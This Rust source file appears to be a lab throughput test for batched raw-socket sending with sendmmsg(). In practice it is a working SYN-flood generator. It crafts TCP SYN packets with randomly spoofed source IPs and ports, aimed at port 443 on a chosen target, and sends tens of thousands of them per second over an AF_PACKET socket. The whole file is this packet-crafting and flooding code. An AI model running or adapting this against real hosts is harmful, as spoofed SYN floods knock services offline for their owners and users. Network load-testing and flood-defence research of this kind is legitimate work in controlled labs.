//! Test sendmmsg() batched packet transmission
//! 
//! This is the middle ground between:
//! - sendto() per packet: ~4k pps (our current approach)
//! - AF_XDP: ~1M+ pps (requires XDP program attached)
//! 
//! sendmmsg() batches multiple packets into one syscall: ~20-50k pps

use std::net::Ipv4Addr;
use std::time::{Duration, Instant};
use rand::{Rng, SeedableRng};

fn main() -> anyhow::Result<()> {
    let interface = std::env::args()
        .nth(1)
        .unwrap_or_else(|| "macv1".to_string());
    
    let target_ip: Ipv4Addr = std::env::args()
        .nth(2)
        .unwrap_or_else(|| "192.168.1.200".to_string())
        .parse()?;

    let target_pps: u32 = std::env::args()
        .nth(3)
        .and_then(|s| s.parse().ok())
        .unwrap_or(50_000);

    println!("=== sendmmsg() Batched Packet Generator ===");
    println!("Interface: {}", interface);
    println!("Target: {}:443", target_ip);
    println!("Target PPS: {}", target_pps);
    println!();

    // Get interface details
    let ifindex = get_ifindex(&interface)?;
    let src_mac = get_mac(&interface)?;
    let dst_mac = get_gateway_mac(target_ip)?;

    println!("Interface index: {}", ifindex);
    println!("Source MAC: {:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
             src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5]);
    println!("Dest MAC: {:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
             dst_mac[0], dst_mac[1], dst_mac[2], dst_mac[3], dst_mac[4], dst_mac[5]);

    // Create AF_PACKET socket
    let fd = unsafe {
        libc::socket(
            libc::AF_PACKET,
            libc::SOCK_RAW,
            (libc::ETH_P_IP as u16).to_be() as i32,
        )
    };
    if fd < 0 {
        anyhow::bail!("Failed to create socket: {}. Need root?", std::io::Error::last_os_error());
    }
    println!("Created AF_PACKET socket");

    // Bind to interface
    let sll = libc::sockaddr_ll {
        sll_family: libc::AF_PACKET as u16,
        sll_protocol: (libc::ETH_P_IP as u16).to_be(),
        sll_ifindex: ifindex,
        sll_hatype: 0,
        sll_pkttype: 0,
        sll_halen: 6,
        sll_addr: [dst_mac[0], dst_mac[1], dst_mac[2], dst_mac[3], dst_mac[4], dst_mac[5], 0, 0],
    };

    let ret = unsafe {
        libc::bind(fd, &sll as *const _ as *const libc::sockaddr,
                   std::mem::size_of::<libc::sockaddr_ll>() as u32)
    };
    if ret < 0 {
        anyhow::bail!("Bind failed: {}", std::io::Error::last_os_error());
    }
    println!("Bound to {}", interface);

    // Pre-allocate packet buffers for batch
    // Increase batch size for higher throughput
    const BATCH_SIZE: usize = 256;
    const PACKET_SIZE: usize = 54;  // Eth(14) + IP(20) + TCP(20)
    
    let mut packets = vec![[0u8; PACKET_SIZE]; BATCH_SIZE];
    let mut iovecs: Vec<libc::iovec> = Vec::with_capacity(BATCH_SIZE);
    let mut msgs: Vec<libc::mmsghdr> = Vec::with_capacity(BATCH_SIZE);

    let mut rng = rand::rngs::StdRng::from_entropy();

    // Stats
    let mut packets_sent = 0u64;
    let mut bytes_sent = 0u64;
    let mut syscalls = 0u64;
    let mut errors = 0u64;

    let test_duration = Duration::from_secs(10);
    // For higher PPS, use larger batches with shorter sleeps
    // Max out at BATCH_SIZE packets per syscall
    let packets_per_batch = (target_pps / 500).max(1) as usize; // 500 batches/sec
    let actual_batch = packets_per_batch.min(BATCH_SIZE);
    let sleep_us = if target_pps > 100_000 { 500 } else { 1000 }; // 0.5-1ms between batches

    println!();
    println!("Config: {} packets/batch, ~{} batches/sec", actual_batch, 1_000_000 / sleep_us);
    println!("Starting 10 second test...");
    println!();

    let start = Instant::now();
    let mut last_log = Instant::now();
    let mut last_packets = 0u64;

    while start.elapsed() < test_duration {
        // Build batch of packets
        iovecs.clear();
        msgs.clear();

        for i in 0..actual_batch {
            // Generate spoofed source IP
            let src_ip = Ipv4Addr::new(10, rng.gen(), rng.gen(), rng.gen::<u8>().max(1));
            let src_port: u16 = rng.gen_range(1024..65535);

            // Write packet to pre-allocated buffer
            craft_syn_packet(
                &mut packets[i],
                &src_mac,
                &dst_mac,
                src_ip,
                target_ip,
                src_port,
                443,
                &mut rng,
            );

            // Set up iovec pointing to this packet
            iovecs.push(libc::iovec {
                iov_base: packets[i].as_mut_ptr() as *mut libc::c_void,
                iov_len: PACKET_SIZE,
            });
        }

        // Set up mmsghdr array
        for i in 0..actual_batch {
            msgs.push(libc::mmsghdr {
                msg_hdr: libc::msghdr {
                    msg_name: std::ptr::null_mut(),
                    msg_namelen: 0,
                    msg_iov: &mut iovecs[i] as *mut libc::iovec,
                    msg_iovlen: 1,
                    msg_control: std::ptr::null_mut(),
                    msg_controllen: 0,
                    msg_flags: 0,
                },
                msg_len: 0,
            });
        }

        // Send batch with single syscall!
        let ret = unsafe {
            libc::sendmmsg(fd, msgs.as_mut_ptr(), actual_batch as u32, 0)
        };
        syscalls += 1;

        if ret > 0 {
            packets_sent += ret as u64;
            bytes_sent += (ret as u64) * (PACKET_SIZE as u64);
        } else if ret < 0 {
            errors += 1;
        }

        // Log every second
        if last_log.elapsed() >= Duration::from_secs(1) {
            let interval_packets = packets_sent - last_packets;
            let pps = interval_packets as f64 / last_log.elapsed().as_secs_f64();
            let elapsed = start.elapsed().as_secs_f64();
            
            println!(
                "[{:5.1}s] {} pkts | {:>7.0} pps | {:.2} MB | {} syscalls | {} err",
                elapsed,
                packets_sent,
                pps,
                bytes_sent as f64 / 1_000_000.0,
                syscalls,
                errors,
            );

            last_log = Instant::now();
            last_packets = packets_sent;
        }

        // Sleep between batches
        std::thread::sleep(Duration::from_micros(sleep_us));
    }

    unsafe { libc::close(fd); }

    // Final stats
    let elapsed = start.elapsed().as_secs_f64();
    println!();
    println!("=== Final Results ===");
    println!("Total packets: {}", packets_sent);
    println!("Total bytes: {:.2} MB", bytes_sent as f64 / 1_000_000.0);
    println!("Total syscalls: {} (vs {} with sendto)", syscalls, packets_sent);
    println!("Duration: {:.2}s", elapsed);
    println!("Average PPS: {:.0}", packets_sent as f64 / elapsed);
    println!("Packets per syscall: {:.1}", packets_sent as f64 / syscalls.max(1) as f64);
    println!("Improvement over sendto: {:.1}x fewer syscalls", 
             packets_sent as f64 / syscalls.max(1) as f64);

    Ok(())
}

fn get_ifindex(name: &str) -> anyhow::Result<i32> {
    let cname = std::ffi::CString::new(name)?;
    let idx = unsafe { libc::if_nametoindex(cname.as_ptr()) };
    if idx == 0 {
        anyhow::bail!("Interface {} not found", name);
    }
    Ok(idx as i32)
}

fn get_mac(name: &str) -> anyhow::Result<[u8; 6]> {
    let path = format!("/sys/class/net/{}/address", name);
    let mac_str = std::fs::read_to_string(&path)?;
    let parts: Vec<u8> = mac_str.trim().split(':')
        .filter_map(|s| u8::from_str_radix(s, 16).ok())
        .collect();
    if parts.len() != 6 {
        anyhow::bail!("Invalid MAC: {}", mac_str);
    }
    Ok([parts[0], parts[1], parts[2], parts[3], parts[4], parts[5]])
}

fn get_gateway_mac(ip: Ipv4Addr) -> anyhow::Result<[u8; 6]> {
    let arp = std::fs::read_to_string("/proc/net/arp")?;
    let ip_str = ip.to_string();
    for line in arp.lines().skip(1) {
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() >= 4 && parts[0] == ip_str && parts[3] != "00:00:00:00:00:00" {
            let mac: Vec<u8> = parts[3].split(':')
                .filter_map(|s| u8::from_str_radix(s, 16).ok())
                .collect();
            if mac.len() == 6 {
                return Ok([mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]]);
            }
        }
    }
    anyhow::bail!("MAC for {} not in ARP cache", ip)
}

fn craft_syn_packet<R: Rng>(
    buf: &mut [u8],
    src_mac: &[u8; 6],
    dst_mac: &[u8; 6],
    src_ip: Ipv4Addr,
    dst_ip: Ipv4Addr,
    src_port: u16,
    dst_port: u16,
    rng: &mut R,
) {
    // Ethernet header (14 bytes)
    buf[0..6].copy_from_slice(dst_mac);
    buf[6..12].copy_from_slice(src_mac);
    buf[12..14].copy_from_slice(&0x0800u16.to_be_bytes());

    // IP header (20 bytes)
    buf[14] = 0x45;  // Version + IHL
    buf[15] = 0x00;  // DSCP
    buf[16..18].copy_from_slice(&40u16.to_be_bytes()); // Length
    buf[18..20].copy_from_slice(&rng.gen::<u16>().to_be_bytes()); // ID
    buf[20] = 0x40;  // Flags: DF
    buf[21] = 0x00;  // Fragment
    buf[22] = 64;    // TTL
    buf[23] = 6;     // TCP
    buf[24..26].copy_from_slice(&[0, 0]); // Checksum placeholder
    buf[26..30].copy_from_slice(&src_ip.octets());
    buf[30..34].copy_from_slice(&dst_ip.octets());

    // IP checksum
    let csum = checksum(&buf[14..34]);
    buf[24..26].copy_from_slice(&csum.to_be_bytes());

    // TCP header (20 bytes)
    buf[34..36].copy_from_slice(&src_port.to_be_bytes());
    buf[36..38].copy_from_slice(&dst_port.to_be_bytes());
    buf[38..42].copy_from_slice(&rng.gen::<u32>().to_be_bytes()); // Seq
    buf[42..46].copy_from_slice(&0u32.to_be_bytes()); // Ack
    buf[46] = 0x50;  // Data offset
    buf[47] = 0x02;  // SYN
    buf[48..50].copy_from_slice(&65535u16.to_be_bytes()); // Window
    buf[50..52].copy_from_slice(&[0, 0]); // Checksum placeholder
    buf[52..54].copy_from_slice(&[0, 0]); // Urgent

    // TCP checksum
    let tcp_csum = tcp_checksum(&src_ip, &dst_ip, &buf[34..54]);
    buf[50..52].copy_from_slice(&tcp_csum.to_be_bytes());
}

fn checksum(data: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    for chunk in data.chunks(2) {
        let val = if chunk.len() == 2 {
            u16::from_be_bytes([chunk[0], chunk[1]]) as u32
        } else {
            (chunk[0] as u32) << 8
        };
        sum += val;
    }
    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    !(sum as u16)
}

fn tcp_checksum(src: &Ipv4Addr, dst: &Ipv4Addr, tcp: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    let s = src.octets();
    let d = dst.octets();
    sum += u16::from_be_bytes([s[0], s[1]]) as u32;
    sum += u16::from_be_bytes([s[2], s[3]]) as u32;
    sum += u16::from_be_bytes([d[0], d[1]]) as u32;
    sum += u16::from_be_bytes([d[2], d[3]]) as u32;
    sum += 6u32;  // TCP protocol
    sum += tcp.len() as u32;

    for (i, chunk) in tcp.chunks(2).enumerate() {
        if i == 8 { continue; }  // Skip checksum field
        let val = if chunk.len() == 2 {
            u16::from_be_bytes([chunk[0], chunk[1]]) as u32
        } else {
            (chunk[0] as u32) << 8
        };
        sum += val;
    }
    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    !(sum as u16)
}
